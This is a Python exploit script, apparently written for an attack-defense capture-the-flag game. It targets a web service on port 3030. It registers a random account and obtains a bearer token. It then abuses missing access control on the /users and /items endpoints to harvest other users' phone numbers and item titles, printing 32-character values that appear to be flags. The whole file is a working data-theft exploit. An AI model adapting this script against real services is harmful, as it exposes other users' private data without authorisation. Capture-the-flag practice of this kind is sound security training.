#!/usr/bin/env python3

import sys
import requests
import random
from checklib import *

ascii_letters = 'aqwertyuiopsdfghjklzxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM'
ascii_lowercase = 'aqwertyuiopsdfghjklzxcvbnm'
ascii_uppercase = 'AQWERTYUIOPSDFGHJKLZXCVBNM'
ascii_digits = '1234567890'

PORT = 3030

specialAlp = '@#^&*_-'
usernameAlp = ascii_letters + ascii_digits
passwordAlp = specialAlp + ascii_letters + ascii_digits + specialAlp
domainAlp = ascii_lowercase

class CrackMachine:
    @property
    def url(self):
        return f'http://{self.host}:{self.port}'

    def __init__(self, host):
        self.host = host
        self.port = PORT
        self.token = None
        self.headers = {}

    def select_token(self, token):
        self.token = token
        self.headers['Authorization'] = 'Bearer ' + token

    def register_user(self):
        templates = ['qsun.microsystems.id_', 'qCN_TID_', 'qcrumples', 'qhacking_you_', 'qoracle.tech.id_', '']
        username = templates[min(random.randint(0, 17), 5)] + rnd_string(random.randint(8, 18), usernameAlp) + '@'
        for _ in range(random.randint(1, 3)):
          username += rnd_string(random.randint(2, 6), domainAlp) + '.'
        username += 'cum'
        password = rnd_string(random.randint(4, 15), passwordAlp)
        password += rnd_string(random.randint(1, 2), specialAlp)
        password += rnd_string(random.randint(1, 3), ascii_lowercase)
        password += rnd_string(random.randint(1, 3), ascii_uppercase)
        password += rnd_string(random.randint(2, 15), passwordAlp)
        password += rnd_string(random.randint(1, 3), ascii_digits)

        phone = rnd_string(random.randint(7, 20), ascii_digits)

        name = rnd_string(random.randint(2, 13), ascii_letters) + ' ' + rnd_string(random.randint(2, 15), ascii_letters)

        sess = get_initialized_session()

        r = sess.post(f'{self.url}/users', data={'email': username, 'password': password, 'phoneNumber': phone, 'name': name})
        #print(r.text)
        assert_eq(r.status_code, 201, 'Could not register')

        return username, password

    def login_user(self, username, password):
        sess = get_initialized_session()
        r = sess.post(f'{self.url}/authentication', data={'email': username, 'password': password, 'strategy': 'local'})
        #print(r.text)

        #print(f'logging as... \t%s : %s' % (username,password,))
        assert_eq(r.status_code, 201, 'Could not login')
        data = get_json(r, 'Could not get login info')
        assert_in('accessToken', data, 'Could not login (no-token)')

        return data["accessToken"]

    def get_phones(self):
        sess = get_initialized_session()

        #getting
        r = sess.get(f'{self.url}/users?$select[]=_id&$sort[createdAt]=-1&$limit=12', headers=self.headers)
        #print(r.text)

        #print(f'checking correctness of phone...')
        assert_eq(r.status_code, 200, 'Could not get phones')

        data = get_json(r, 'Could not get phones')
        #print(data['data'])
        for user in data['data']:
            self.get_number_of(user['_id'])
        #print(f'Got: %s and %s' % (number, data['phoneNumber'],))

        return

    def get_number_of(self, userId):
        sess = get_initialized_session()
        #print('getting ' + userId)
        #getting
        r = sess.get(f'{self.url}/users/' + userId, headers=self.headers)
        #print(r.text)

        #print(f'checking correctness of phone...')
        assert_eq(r.status_code, 200, 'Could not get user')

        data = get_json(r, 'Could not get user')
        if len(data['phoneNumber']) == 32:
            print(data['phoneNumber'], flush=True)

        #print(f'Got: %s and %s' % (number, data['phoneNumber'],))

        return

    def get_items(self):
        sess = get_initialized_session()

        #getting
        r = sess.get(f'{self.url}/items?$select[]=title&$sort[createdAt]=-1&$limit=12', headers=self.headers)
        #print(r.text)

        #print(f'checking correctness of phone...')
        assert_eq(r.status_code, 200, 'Could not get items')

        data = get_json(r, 'Could not get phones')
        #print(data['data'])
        for item in data['data']:
            #print(item['title'])
            if len(item['title']) == 32 and item['title'][-1] == '=':
                print(item['title'], flush=True)
        #print(f'Got: %s and %s' % (number, data['phoneNumber'],))

        return

def hack(host):
    cm = CrackMachine(host)

    username, password = cm.register_user()
    token = cm.login_user(username, password)
    cm.select_token(token)
    cm.get_phones()
    cm.get_items()

    cquit(Status.OK)

if __name__ == '__main__':
    args = sys.argv[1:]

    try:
        host, = args
        hack(host)

        cquit(Status.ERROR)
    except requests.exceptions.ConnectionError:
        cquit(Status.DOWN, 'Connection error')
    except SystemError as e:
        raise
    except Exception as e:
        print(f'Got an exception {e} {type(e)} {repr(e)}')
        cquit(Status.ERROR, 'System error', str(e))
